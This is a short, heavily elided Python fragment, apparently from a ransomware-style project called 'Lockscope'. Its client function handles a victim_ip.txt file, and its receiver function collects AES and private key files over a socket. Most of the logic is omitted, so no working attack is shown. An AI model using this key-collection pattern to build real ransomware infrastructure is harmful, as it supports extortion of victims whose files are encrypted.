...
def client(key,public_key,private_key):
    ...
    with open(r"C:\Users\User\Desktop\Lockscope\Fase 4\victim_ip.txt", "wb") as f:
    ...
    with open(r"C:\Users\User\Desktop\Lockscope\Fase 4\victim_ip.txt", "rb") as f:
        victim_ip = f.read()
...
def receiver():
    ...
    path_aes_key = os.path.join(r"C:\Users\User\Desktop\Lockscope\Fase 4", filename_aes_key)
    with open(path_aes_key, "wb") as f:
        data1 = conn.recv(1024)
        f.write(data1)

    filename_private_key = conn.recv(1024).decode()
    path_private_key = os.path.join(r"C:\Users\User\Desktop\Lockscope\Fase 4", filename_private_key)
